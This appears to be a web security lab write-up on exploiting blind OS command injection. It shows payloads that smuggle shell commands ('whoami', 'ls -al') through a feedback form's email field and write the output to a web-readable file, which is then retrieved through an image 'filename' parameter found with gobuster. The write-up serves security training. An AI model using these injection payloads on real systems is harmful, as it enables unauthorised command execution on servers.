The command injection is same as the last lab. The only difference is this time we will inject the command mentioned in lab objective. So the payload is :-

```
&name=Dude&email=dude;whoami+>>+/var/www/images/file.txt;sleep+10;&subject=Just+a+cool+dude
```

**Note**:- I've added a **sleep** command just to be sure my payload got executed successfully.


So, now the file is created and we've to access it. Next, run `gobuster` to figure out the directory structure.

### Gobuster output

![image](https://user-images.githubusercontent.com/86168235/128371378-fefa4eca-20d0-41b5-a70f-6b9b38b48d97.png)

In the output we can see that there is folder called **image**. Visiting the url gives the following error:-

![image](https://user-images.githubusercontent.com/86168235/128371570-a21b8ced-29dc-43ce-a764-f3873e0553ad.png)

So, it means we need to add a parameter called `filename` to access a particular file(in this case an image, as the **image** url suggests). So, after adding the parameter `filename` and querying our file we get the `username`.

![image](https://user-images.githubusercontent.com/86168235/128371851-b4529350-9144-4885-8834-6c1442400bfb.png)

**Note**:- Alternatively, you can either spider the host or try to load a product and intercept the request that tries to load an image and modify that url to load our exploit file. But, as during information gathering phase one of the first things I do is run a directory scanner I'll come across the **image** url(and thus the filename param) before I find any command injection.

#### Optional

**Now**, lets do a directory listing and see the content of the directory.

```
&name=Dude&email=dude;ls+-al+>>+/var/www/images/file.txt;sleep+10;&subject=Just+a+cool+dude
```
Refreshing the page we see the contents of the directory.

![image](https://user-images.githubusercontent.com/86168235/128372547-17c6eff7-ce30-432c-956e-2b7a91ae6140.png)

